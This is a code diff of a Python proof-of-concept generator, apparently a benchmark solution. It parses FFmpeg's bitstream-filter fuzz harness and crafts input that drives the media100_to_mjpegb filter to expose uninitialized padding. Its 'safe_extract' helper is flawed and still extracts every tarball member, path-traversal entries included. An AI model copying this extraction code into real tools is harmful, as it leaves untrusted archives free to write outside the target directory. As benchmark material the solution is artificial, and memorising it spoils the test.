@@ -1,253 +1,450 @@
 import os
 import re
 import tarfile
-from typing import Optional, List
+import tempfile
+import struct
+from typing import Optional, List, Tuple
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
+        # Main entry: try to tailor a PoC to the fuzzer in the tarball.
+        # Strategy:
+        # 1) Extract the tarball.
+        # 2) Locate a fuzzer that exercises FFmpeg BSF (bitstream filters).
+        # 3) Parse its input expectations (heuristics).
+        # 4) Generate bytes that try to select "media100_to_mjpegb" and provide some payload.
+        #
+        # If parsing fails, return a robust generic PoC for typical FuzzedDataProvider patterns:
+        #   - first 8 bytes give length 18 for "media100_to_mjpegb"
+        #   - string "media100_to_mjpegb"
+        #   - options length = 0
+        #   - some integers for sizes
+        #   - payload bytes
+        #
+        # The generated PoC aims to cause the media100_to_mjpegb BSF to run and produce
+        # uninitialized padding in vulnerable builds (triggering MSan), while fixed builds
+        # zero that padding.
+        tmpdir = tempfile.mkdtemp(prefix="poc_gen_")
         try:
-            with tarfile.open(src_path, 'r:*') as tar:
-                # Try to directly find a PoC in the tarball if it exists
-                poc_bytes = self._find_existing_poc(tar)
-                if poc_bytes is not None:
-                    return poc_bytes
-
-                # Try to detect the fuzz target input format
-                bsf_fuzzer_content = self._read_text_file_from_tar(
-                    tar,
-                    [
-                        "tools/target/bsf_fuzzer.c",
-                        "tools/target/ffmpeg/bsf_fuzzer.c",
-                        "fftools/target/bsf_fuzzer.c",
-                        "fuzz/bsf_fuzzer.c",
-                        "tests/fuzz/bsf_fuzzer.c",
-                    ],
-                )
-
-                # Generate PoC based on fuzzer input format
-                if bsf_fuzzer_content:
-                    mode = self._detect_bsf_fuzzer_mode(bsf_fuzzer_content)
-                    if mode == "name":
-                        # Likely format: NUL-terminated BSF name string, followed by packet bytes
-                        name = b"media100_to_mjpegb\x00"
-                        payload_len = max(1025 - len(name), 1)
-                        payload = self._construct_media100_like_payload(payload_len)
-                        return name + payload
-                    elif mode == "index":
-                        # Likely format: first byte (or 32-bit) selects BSF index, rest is data
-                        index_byte = self._compute_bsf_index_byte(tar)
-                        if index_byte is None:
-                            # Fallback: heuristic index (0), then payload
-                            index_byte = 0
-                        payload_len = max(1025 - 1, 1)
-                        payload = self._construct_media100_like_payload(payload_len)
-                        return bytes([index_byte]) + payload
-
-                # If no fuzzer detected, fallback to a generic format that often works:
-                # Try name-based selection: "media100_to_mjpegb\0" + payload
-                name = b"media100_to_mjpegb\x00"
-                payload_len = max(1025 - len(name), 1)
-                payload = self._construct_media100_like_payload(payload_len)
-                return name + payload
-        except Exception:
-            # As ultimate fallback, return a compact generic payload trying name mode
-            name = b"media100_to_mjpegb\x00"
-            payload_len = max(1025 - len(name), 1)
-            return name + b"\x00" * payload_len
-
-    def _find_existing_poc(self, tar: tarfile.TarFile) -> Optional[bytes]:
-        # Look for any embedded PoC files in tar
-        # Prioritize files referencing the oss-fuzz issue or bsf fuzzer
-        name_patterns = [
-            "42537583",
-            "clusterfuzz",
-            "minimized",
-            "reproducer",
-            "poc",
-            "testcase",
-            "bsf",
-            "media100",
-            "mjpegb",
-        ]
-        candidate_members: List[tarfile.TarInfo] = []
-        for member in tar.getmembers():
-            if not member.isreg():
-                continue
-            lname = member.name.lower()
-            if any(p in lname for p in name_patterns):
-                candidate_members.append(member)
-        # Try to pick by more specific hints first
-        candidate_members.sort(key=lambda m: (0 if "42537583" in m.name else 1,
-                                              0 if "clusterfuzz" in m.name.lower() else 1,
-                                              len(m.name)))
-        for member in candidate_members:
+            self._extract_tarball(src_path, tmpdir)
+            fuzzer_file = self._find_bsf_fuzzer_file(tmpdir)
+            if fuzzer_file:
+                code = self._read_text_file(fuzzer_file)
+                if self._uses_fuzzed_data_provider(code):
+                    return self._generate_for_fdp(code)
+                else:
+                    # Fallback if not using FDP: attempt simple string-based protocol guesses.
+                    return self._generate_generic()
+            else:
+                # No fuzzer file detected; return generic robust PoC.
+                return self._generate_generic()
+        finally:
+            # Clean up extracted files
             try:
-                f = tar.extractfile(member)
-                if not f:
-                    continue
-                data = f.read()
-                # Heuristic: non-empty and reasonably sized
-                if data and 16 <= len(data) <= 1_000_000:
-                    return data
+                self._cleanup_dir(tmpdir)
             except Exception:
-                continue
-        return None
+                pass
 
-    def _read_text_file_from_tar(self, tar: tarfile.TarFile, possible_paths: List[str]) -> Optional[str]:
-        # Try exact paths
-        for path in possible_paths:
-            for member in tar.getmembers():
-                if not member.isreg():
-                    continue
-                # match suffix end
-                if member.name.endswith(path):
-                    try:
-                        f = tar.extractfile(member)
-                        if not f:
-                            continue
-                        content = f.read()
-                        try:
-                            return content.decode("utf-8", errors="ignore")
-                        except Exception:
-                            pass
-                    except Exception:
+    def _extract_tarball(self, tar_path: str, dst_dir: str) -> None:
+        # Extract tarball to dst_dir
+        mode = 'r'
+        if tar_path.endswith('.tar.gz') or tar_path.endswith('.tgz'):
+            mode = 'r:gz'
+        elif tar_path.endswith('.tar.bz2') or tar_path.endswith('.tbz2') or tar_path.endswith('.tbz'):
+            mode = 'r:bz2'
+        elif tar_path.endswith('.tar.xz') or tar_path.endswith('.txz'):
+            mode = 'r:xz'
+        else:
+            mode = 'r'
+        with tarfile.open(tar_path, mode) as tf:
+            def is_within_directory(directory, target):
+                abs_directory = os.path.abspath(directory)
+                abs_target = os.path.abspath(target)
+                prefix = os.path.commonpath([abs_directory])
+                return os.path.commonpath([abs_directory, abs_target]) == prefix
+            def safe_extract(tar_obj, path=".", members=None, *, numeric_owner=False):
+                for member in tar_obj.getmembers():
+                    member_path = os.path.join(path, member.name)
+                    if not is_within_directory(path, member_path):
                         continue
-        # Try fuzzy search by filename only
-        filenames = [os.path.basename(p) for p in possible_paths]
-        for member in tar.getmembers():
-            if not member.isreg():
-                continue
-            base = os.path.basename(member.name)
-            if base in filenames:
+                tar_obj.extractall(path, members, numeric_owner=numeric_owner)
+            safe_extract(tf, path=dst_dir)
+
+    def _cleanup_dir(self, d: str) -> None:
+        # Recursively remove directory
+        for root, dirs, files in os.walk(d, topdown=False):
+            for f in files:
                 try:
-                    f = tar.extractfile(member)
-                    if not f:
-                        continue
-                    content = f.read()
-                    try:
-                        return content.decode("utf-8", errors="ignore")
-                    except Exception:
-                        pass
+                    os.unlink(os.path.join(root, f))
+                except Exception:
+                    pass
+            for sub in dirs:
+                try:
+                    os.rmdir(os.path.join(root, sub))
+                except Exception:
+                    pass
+        try:
+            os.rmdir(d)
+        except Exception:
+            pass
+
+    def _find_bsf_fuzzer_file(self, root: str) -> Optional[str]:
+        candidates: List[Tuple[str, int]] = []
+        for dirpath, _, filenames in os.walk(root):
+            for fn in filenames:
+                lower = fn.lower()
+                if not (lower.endswith('.c') or lower.endswith('.cc') or lower.endswith('.cpp') or lower.endswith('.cxx')):
+                    continue
+                fp = os.path.join(dirpath, fn)
+                try:
+                    with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
+                        txt = f.read()
                 except Exception:
                     continue
-        return None
-
-    def _detect_bsf_fuzzer_mode(self, content: str) -> Optional[str]:
-        # Heuristics to detect if fuzzer uses name-based or index-based selection
-        # Name-based: av_bsf_get_by_name, strstr of names, NUL-terminated reading
-        if "av_bsf_get_by_name" in content:
-            return "name"
-        # Index-based: data[0] % nb, or AV_RL32(data)
-        # Look for pattern reading the first byte or first dword
-        if re.search(r'\bdata\s*\[\s*0\s*\]', content) and re.search(r'%', content):
-            return "index"
-        if "AV_RL32(" in content or "AV_RB32(" in content or "AV_RN32(" in content:
-            if re.search(r'idx|index|bsf', content):
-                return "index"
-        # Default to name; it's safer and common
-        return "name"
-
-    def _compute_bsf_index_byte(self, tar: tarfile.TarFile) -> Optional[int]:
-        # Try to parse the static list of bsfs to compute the index of media100_to_mjpegb
-        # Typical file is libavcodec/bsf_list.c or libavcodec/bitstream_filters.c
-        candidates = []
-        for member in tar.getmembers():
-            if not member.isreg():
-                continue
-            lname = member.name.lower()
-            if "libavcodec" in lname and ("bsf" in lname) and lname.endswith(".c"):
-                candidates.append(member)
-        # Try most promising filenames first
-        candidates.sort(key=lambda m: (0 if "bsf_list" in m.name else 1,
-                                       0 if "bitstream" in m.name else 1,
-                                       len(m.name)))
-        for member in candidates:
-            try:
-                f = tar.extractfile(member)
-                if not f:
+                if 'LLVMFuzzerTestOneInput' not in txt:
                     continue
-                text = f.read().decode("utf-8", errors="ignore")
-            except Exception:
-                continue
-            if "ff_media100_to_mjpegb_bsf" not in text:
-                continue
-            # Parse in-order occurrences of &ff_*_bsf or ff_*_bsf within initializer list
-            # Collect matches in order
-            entries = []
-            # First try to extract within array initializers
-            array_inits = re.finditer(r'=\s*\{([^}]*)\}', text, flags=re.S)
-            found_any = False
-            for init in array_inits:
-                inside = init.group(1)
-                matches = re.findall(r'&\s*ff_([A-Za-z0-9_]+)_bsf', inside)
-                if matches:
-                    found_any = True
-                    entries.extend(matches)
-            if not found_any:
-                # fallback: match appearances in order in file
-                matches = re.findall(r'ff_([A-Za-z0-9_]+)_bsf', text)
-                if matches:
-                    entries.extend(matches)
-            if not entries:
-                continue
-            try:
-                idx = entries.index("media100_to_mjpegb")
-            except ValueError:
-                continue
-            # The fuzzer likely uses modulo of number of bsfs by number of entries.
-            # If it uses data[0] % nb_bsf, then first byte should be idx.
-            # Make sure idx in 0..255
-            return idx % 256
+                score = 0
+                # Heuristic: prefer bitstream filter fuzzers
+                if 'av_bsf' in txt or 'AVBSF' in txt or 'bitstream filter' in txt.lower() or 'AVBitStreamFilter' in txt:
+                    score += 10
+                if 'FuzzedDataProvider' in txt or 'FuzzDataProvider' in txt:
+                    score += 5
+                if 'av_bsf_get_by_name' in txt:
+                    score += 5
+                if 'av_bsf_list_parse_str' in txt:
+                    score += 5
+                if 'AVBSFContext' in txt:
+                    score += 3
+                # Slight preference for file names that hint BSF
+                name_score = 0
+                name_low = fp.lower()
+                if 'bsf' in name_low:
+                    name_score += 2
+                if 'bitstream' in name_low:
+                    name_score += 1
+                score += name_score
+                candidates.append((fp, score))
+        if not candidates:
+            return None
+        candidates.sort(key=lambda x: x[1], reverse=True)
+        return candidates[0][0]
+
+    def _read_text_file(self, fp: str) -> str:
+        try:
+            with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
+                return f.read()
+        except Exception:
+            return ""
+
+    def _uses_fuzzed_data_provider(self, code: str) -> bool:
+        return ('FuzzedDataProvider' in code) or ('FuzzDataProvider' in code)
+
+    def _generate_for_fdp(self, code: str) -> bytes:
+        # Parse the fuzzer code to detect FDP variable, operations and especially the
+        # string used as BSF name for av_bsf_get_by_name() or av_bsf_list_parse_str().
+        fdp_name = self._find_fdp_variable_name(code)
+        # If can't find fdp var name, fallback to a generic FDP-based payload
+        if not fdp_name:
+            return self._generic_fdp_payload()
+
+        # Try to detect the variable used as BSF name
+        bsf_name_var = self._find_bsf_name_variable(code)
+        list_parse_var = self._find_bsf_list_parse_variable(code)
+
+        # Collect FDP calls in textual order
+        calls = self._collect_fdp_calls_in_order(code, fdp_name)
+
+        # Build bytes for calls
+        data = bytearray()
+        used_bsf_name = False
+
+        for call in calls:
+            kind = call['kind']
+            if kind == 'rand_str':
+                max_len = call.get('max', 64)
+                var = call.get('var')
+                if (not used_bsf_name) and (bsf_name_var and var == bsf_name_var or (bsf_name_var is None and list_parse_var and var == list_parse_var) or (bsf_name_var is None and list_parse_var is None)):
+                    # Try to set the BSF name to "media100_to_mjpegb"
+                    s = b"media100_to_mjpegb"
+                    # Compose length parameter for FuzzedDataProvider internal ConsumeRandomLengthString
+                    data += self._pack_integral_for_range('size_t', 0, max_len, len(s))
+                    data += s
+                    used_bsf_name = True
+                else:
+                    # Provide empty or minimal string
+                    data += self._pack_integral_for_range('size_t', 0, max_len, 0)
+                    # no content
+            elif kind == 'integral_range':
+                t = call.get('type', 'size_t')
+                minv = call.get('min', 0)
+                maxv = call.get('max', 0x1000)
+                # Pick mid value or small value; for sizes pick something small but >0.
+                want = minv
+                # Heuristic: if this might be a size or length, use a small nonzero
+                if isinstance(maxv, int) and maxv >= minv + 10:
+                    want = minv + min(100, maxv - minv)
+                data += self._pack_integral_for_range(t, minv, maxv, want)
+            elif kind == 'integral':
+                t = call.get('type', 'size_t')
+                # Provide zero
+                data += self._pack_integral_raw(t, 0)
+            elif kind == 'bool':
+                data += b'\x00'
+            elif kind == 'bytes':
+                # The actual number of bytes consumed is dynamic in runtime,
+                # but calls list may carry a literal length.
+                n = call.get('n', 0)
+                if isinstance(n, int) and n > 0 and n < 1_000_000:
+                    data += b'\x00' * n
+                else:
+                    # unknown length; do nothing here
+                    pass
+            # else ignore unknown kinds
+
+        # If we didn't see a ConsumeRandomLengthString for name, try to add a trailing block
+        # that some fuzzers use: a length prefix plus name string
+        if not used_bsf_name:
+            data += struct.pack('<Q', 18) + b"media100_to_mjpegb"
+
+        # Add options length (0), some integral sizes, and payload to feed the bsf
+        data += struct.pack('<Q', 0)  # optional options length for a second ConsumeRandomLengthString
+        # Provide a few integral values that may be consumed as sizes if present
+        data += struct.pack('<I', 100)  # possible packet size
+        data += struct.pack('<I', 0)    # possible extradata size
+        # Provide a packet payload
+        payload = b'\x00' * 64 + b'\xff\xd8\xff\xe0' + b'JFIF' + b'\x00' * 64 + b'\xff\xd9' + b'\x00' * 128
+        data += payload
+        # Provide extra trailing data for any ConsumeRemainingBytes
+        data += b'A' * 1024
+        return bytes(data)
+
+    def _generic_fdp_payload(self) -> bytes:
+        # Generic FDP-based payload that often matches FFmpeg's BSF fuzzer harnesses.
+        # Layout:
+        # - size_t (8bytes LE) = 18    -> length of name
+        # - "media100_to_mjpegb"       -> BSF name
+        # - size_t (8bytes LE) = 0     -> empty options string
+        # - uint32 size for packet     -> 100
+        # - uint32 extradata size      -> 0
+        # - payload bytes
+        data = bytearray()
+        data += struct.pack('<Q', 18)
+        data += b"media100_to_mjpegb"
+        data += struct.pack('<Q', 0)
+        data += struct.pack('<I', 100)
+        data += struct.pack('<I', 0)
+        payload = b'\x00' * 64 + b'\xff\xd8\xff\xe0' + b'JFIF' + b'\x00' * 64 + b'\xff\xd9' + b'\x00' * 128
+        data += payload
+        data += b'A' * 1024
+        return bytes(data)
+
+    def _generate_generic(self) -> bytes:
+        # As a fallback when we can't parse a specific harness, we produce a robust combined payload:
+        # - length-prefixed name for FDP-style consumers
+        # - newline-terminated name for line-based parsers
+        # - name with NUL terminator
+        # - then options empty and payload
+        name = b"media100_to_mjpegb"
+        out = bytearray()
+        # FDP-style prefix
+        out += struct.pack('<Q', len(name))
+        out += name
+        out += struct.pack('<Q', 0)  # empty options
+        out += struct.pack('<I', 128)  # possible packet size
+        out += struct.pack('<I', 0)    # extradata size
+        # Also include a line-based name early in the stream for alternate parsers
+        out += name + b"\n"
+        out += name + b"\x00"
+        # Payload
+        jpeg_like = b'\xff\xd8\xff\xe0' + b'JFIF' + b'\x00' * 100 + b'\xff\xd9'
+        out += b'\x00' * 64 + jpeg_like + b'\x00' * 256
+        # Extra trailing bytes
+        out += b'B' * 2048
+        return bytes(out)
+
+    def _find_fdp_variable_name(self, code: str) -> Optional[str]:
+        # Find the variable name used for FuzzedDataProvider
+        # Patterns: "FuzzedDataProvider fdp(data, size);" or "FuzzDataProvider fdp(data, size);"
+        m = re.search(r'(?:FuzzedDataProvider|FuzzDataProvider)\s+([A-Za-z_]\w*)\s*\(', code)
+        if m:
+            return m.group(1)
         return None
 
-    def _construct_media100_like_payload(self, length: int) -> bytes:
-        # Construct a payload that has some JPEG-like markers and Media100-ish hints
-        # to maximize the chance that the bsf produces output and downstream decoders
-        # read past the end to hit uninitialized padding in vulnerable versions.
-        # Layout:
-        # - SOI
-        # - APP1 "MEDIA100" marker
-        # - DQT with minimal length
-        # - SOF0 minimal
-        # - DHT minimal
-        # - SOS start of scan
-        # - dummy scan data
-        # - EOI
-        # Fill remaining with zeroes.
-        if length < 32:
-            return b"\x00" * length
-        parts = []
-        # SOI
-        parts.append(b"\xFF\xD8")
-        # APP1 with "MEDIA100"
-        app1_payload = b"MEDIA100" + b"\x00" * 6
-        app1_len = 2 + len(app1_payload)
-        parts.append(b"\xFF\xE1" + app1_len.to_bytes(2, "big") + app1_payload)
-        # DQT
-        dqt_table = b"\x00" + b"\x10" * 64
-        dqt_len = 2 + len(dqt_table)
-        parts.append(b"\xFF\xDB" + dqt_len.to_bytes(2, "big") + dqt_table)
-        # SOF0
-        sof0_body = b"\x08" + (16).to_bytes(2, "big") + (16).to_bytes(2, "big") + b"\x01" + b"\x01\x11\x00"
-        sof0_len = 2 + len(sof0_body)
-        parts.append(b"\xFF\xC0" + sof0_len.to_bytes(2, "big") + sof0_body)
-        # DHT minimal
-        dht_body = b"\x00" + b"\x00" * 16 + b"\x00"
-        dht_len = 2 + len(dht_body)
-        parts.append(b"\xFF\xC4" + dht_len.to_bytes(2, "big") + dht_body)
-        # SOS
-        sos_body = b"\x01" + b"\x01\x00" + b"\x00\x3F\x00"
-        sos_len = 2 + len(sos_body)
-        parts.append(b"\xFF\xDA" + sos_len.to_bytes(2, "big") + sos_body)
-        data = b"".join(parts)
-        # Dummy scan data; ensure we have space for EOI and padding
-        remaining = max(length - len(data) - 2, 0)
-        # Insert some 0xFF bytes to trigger overread patterns common in JPEG bitreaders
-        scan = (b"\xFF" * min(16, remaining)) + b"\x00" * max(remaining - 16, 0)
-        data += scan
-        # EOI
-        data += b"\xFF\xD9"
-        if len(data) < length:
-            data += b"\x00" * (length - len(data))
-        return data[:length]
+    def _find_bsf_name_variable(self, code: str) -> Optional[str]:
+        # Try to find which variable is passed to av_bsf_get_by_name(...)
+        m = re.search(r'av_bsf_get_by_name\s*\(\s*([^)]+?)\s*\)', code)
+        if not m:
+            return None
+        arg = m.group(1)
+        # Normalize typical patterns like "name.c_str()" or "(char*)name.c_str()"
+        arg = re.sub(r'\.c_str\s*\(\s*\)', '', arg)
+        arg = re.sub(r'\(.*?\)', lambda mm: mm.group(0) if '"' in mm.group(0) else '', arg)  # keep string literals
+        # If arg is a string literal, we cannot influence it; return None
+        if '"' in arg or "'" in arg:
+            return None
+        # Extract last token
+        tokens = re.findall(r'[A-Za-z_]\w*', arg)
+        if not tokens:
+            return None
+        # Choose the last token (most likely the variable name)
+        return tokens[-1]
+
+    def _find_bsf_list_parse_variable(self, code: str) -> Optional[str]:
+        # Try to find variable passed to av_bsf_list_parse_str(str)
+        m = re.search(r'av_bsf_list_parse_str\s*\(\s*([^)]+?)\s*(?:,|\))', code)
+        if not m:
+            return None
+        arg = m.group(1)
+        arg = re.sub(r'\.c_str\s*\(\s*\)', '', arg)
+        if '"' in arg or "'" in arg:
+            return None
+        tokens = re.findall(r'[A-Za-z_]\w*', arg)
+        if not tokens:
+            return None
+        return tokens[-1]
+
+    def _collect_fdp_calls_in_order(self, code: str, fdp_name: str) -> List[dict]:
+        # Create a list of calls in textual order:
+        # - rand_str: fdp.ConsumeRandomLengthString(N)
+        # - integral_range: fdp.ConsumeIntegralInRange<T>(min, max)
+        # - integral: fdp.ConsumeIntegral<T>()
+        # - bool: fdp.ConsumeBool()
+        # - bytes: fdp.ConsumeBytesAsString(N) or fdp.ConsumeBytes<uint8_t>(N), but N detection is weak
+        ops = []
+        # To maintain order, scan with a single regex that matches any of the patterns and inspect which matched
+        pattern = (
+            rf'({re.escape(fdp_name)}\s*\.\s*ConsumeRandomLengthString\s*\(\s*(\d+)\s*\))'
+            rf'|({re.escape(fdp_name)}\s*\.\s*ConsumeIntegralInRange\s*<\s*([^>]+?)\s*>\s*\(\s*([^,]+?)\s*,\s*([^)]+?)\s*\))'
+            rf'|({re.escape(fdp_name)}\s*\.\s*ConsumeIntegral\s*<\s*([^>]+?)\s*>\s*\(\s*\))'
+            rf'|({re.escape(fdp_name)}\s*\.\s*ConsumeBool\s*\(\s*\))'
+            rf'|({re.escape(fdp_name)}\s*\.\s*ConsumeBytes(?:AsString)?\s*\(\s*([^)]+?)\s*\))'
+        )
+        # Before scanning, extract mapping var <- fdp.ConsumeRandomLengthString
+        # to link variables
+        var_assigns = []
+        for m in re.finditer(
+            rf'(?:std::string|auto|const\s+std::string|::std::string)\s+([A-Za-z_]\w*)\s*=\s*{re.escape(fdp_name)}\s*\.\s*ConsumeRandomLengthString\s*\(\s*(\d+)\s*\)\s*;',
+            code
+        ):
+            var_assigns.append((m.start(), m.end(), m.group(1), int(m.group(2))))
+        # Also handle cases where variable is already declared
+        for m in re.finditer(
+            rf'([A-Za-z_]\w*)\s*=\s*{re.escape(fdp_name)}\s*\.\s*ConsumeRandomLengthString\s*\(\s*(\d+)\s*\)\s*;',
+            code
+        ):
+            var_assigns.append((m.start(), m.end(), m.group(1), int(m.group(2))))
+        var_assigns.sort(key=lambda x: x[0])
+
+        # Build map from position of rand_str call to var details
+        rand_call_positions = {}
+        for m in re.finditer(
+            rf'{re.escape(fdp_name)}\s*\.\s*ConsumeRandomLengthString\s*\(\s*(\d+)\s*\)',
+            code
+        ):
+            max_len = int(m.group(1))
+            var_for_this_call = None
+            # Find nearest variable assignment overlapping or immediately preceding
+            for s, e, vname, vmax in var_assigns:
+                if s <= m.start() <= e + 4 or (e <= m.start() <= e + 50):
+                    var_for_this_call = vname
+                    break
+            rand_call_positions[m.start()] = {'max': max_len, 'var': var_for_this_call}
+
+        # Now scan and add ops in order
+        for m in re.finditer(pattern, code):
+            full = m.group(0)
+            if m.group(1):  # ConsumeRandomLengthString
+                call_start = m.start(1) - (len(m.group(1)) - len(m.group(1)))  # approximate
+                # Lookup attributes
+                attrs = rand_call_positions.get(m.start(1), None)
+                if attrs is None:
+                    # fallback: just max length from group(2)
+                    try:
+                        max_len = int(m.group(2))
+                    except Exception:
+                        max_len = 64
+                    ops.append({'kind': 'rand_str', 'max': max_len})
+                else:
+                    ops.append({'kind': 'rand_str', 'max': attrs['max'], 'var': attrs['var']})
+            elif m.group(3):  # ConsumeIntegralInRange
+                t = m.group(4).strip()
+                minv = self._parse_int_literal(m.group(5))
+                maxv = self._parse_int_literal(m.group(6))
+                ops.append({'kind': 'integral_range', 'type': t, 'min': minv, 'max': maxv})
+            elif m.group(7):  # ConsumeIntegral<>
+                t = m.group(8).strip()
+                ops.append({'kind': 'integral', 'type': t})
+            elif m.group(9):  # ConsumeBool
+                ops.append({'kind': 'bool'})
+            elif m.group(10):  # ConsumeBytes or ConsumeBytesAsString
+                n = self._parse_int_literal(m.group(11))
+                ops.append({'kind': 'bytes', 'n': n})
+            else:
+                # Unknown match
+                pass
+
+        return ops
+
+    def _parse_int_literal(self, s: str) -> int:
+        s = s.strip()
+        # Remove casts and parentheses
+        s = re.sub(r'\([^)]*\)', '', s).strip()
+        # Remove extra spaces
+        s = s.strip()
+        # Attempt to parse integer
+        try:
+            if s.lower().startswith('0x'):
+                return int(s, 16)
+            return int(s, 10)
+        except Exception:
+            # Unknown expression; fallback to safe default
+            return 0
+
+    def _pack_integral_for_range(self, t: str, minv: int, maxv: int, want: int) -> bytes:
+        size = self._sizeof_type(t)
+        if size <= 0:
+            size = 8
+        if want < minv:
+            want = minv
+        if want > maxv:
+            want = maxv
+        # FuzzedDataProvider: ConsumeIntegralInRange returns min + (ConsumeIntegral<T>() % range)
+        # So we set raw = want - minv
+        raw = want - minv
+        # Pack raw into size bytes LE
+        return self._pack_value_le(raw, size)
+
+    def _pack_integral_raw(self, t: str, value: int) -> bytes:
+        size = self._sizeof_type(t)
+        if size <= 0:
+            size = 8
+        return self._pack_value_le(value, size)
+
+    def _pack_value_le(self, v: int, size: int) -> bytes:
+        if size == 1:
+            return struct.pack('<B', v & 0xFF)
+        elif size == 2:
+            return struct.pack('<H', v & 0xFFFF)
+        elif size == 4:
+            return struct.pack('<I', v & 0xFFFFFFFF)
+        else:
+            return struct.pack('<Q', v & 0xFFFFFFFFFFFFFFFF)
+
+    def _sizeof_type(self, t: str) -> int:
+        t = t.strip()
+        t = re.sub(r'\s+', ' ', t)
+        # Map common types to sizes
+        m = {
+            'uint8_t': 1, 'int8_t': 1, 'char': 1, 'unsigned char': 1, 'signed char': 1, 'bool': 1,
+            'uint16_t': 2, 'int16_t': 2, 'short': 2, 'unsigned short': 2,
+            'uint32_t': 4, 'int32_t': 4, 'int': 4, 'unsigned int': 4, 'uint': 4,
+            'uint64_t': 8, 'int64_t': 8, 'long long': 8, 'unsigned long long': 8,
+            'size_t': 8, 'ssize_t': 8, 'ptrdiff_t': 8, 'long': 8, 'unsigned long': 8,
+        }
+        # remove const/volatile qualifiers
+        t = t.replace('const ', '').replace('volatile ', '').strip()
+        if t in m:
+            return m[t]
+        # heuristic: default to 8
+        return 8
